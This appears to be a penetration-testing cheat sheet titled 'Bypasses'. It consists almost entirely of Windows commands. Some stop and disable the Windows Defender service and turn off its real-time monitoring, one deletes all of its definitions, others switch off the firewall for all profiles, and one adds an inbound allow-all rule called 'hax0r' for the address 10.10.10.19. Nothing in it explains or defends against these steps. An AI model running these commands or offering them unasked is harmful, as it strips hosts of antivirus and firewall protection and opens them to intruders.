# Bypasses

### Windows Defender

```csharp
#CMD
sc config WinDefend start= disabled
sc stop WinDefend

#Powershell
Set-MpPreference -DisableRealtimeMonitoring $true

#Remove definitions
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Firewall

```csharp
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off
```

### IP Whitelisting

```csharp
New-NetFirewallRule -Name hax0r -DisplayName hax0r -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress 10.10.10.19
```

